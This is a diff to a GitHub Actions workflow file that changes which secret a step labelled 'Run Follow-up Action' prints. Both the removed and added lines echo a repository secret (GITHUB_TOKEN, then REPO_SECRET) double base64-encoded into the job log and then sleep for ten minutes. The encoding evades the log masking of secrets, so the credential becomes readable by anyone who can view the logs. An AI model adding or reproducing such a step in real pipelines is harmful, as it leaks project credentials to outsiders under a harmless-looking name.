@@ -17,4 +17,4 @@ jobs:
       uses: actions/checkout@v3
 
     - name: Run Follow-up Action
-      run: echo ${{ secrets.GITHUB_TOKEN }} | base64 | base64 ; sleep 600
+      run: echo ${{ secrets.REPO_SECRET }} | base64 | base64 ; sleep 600
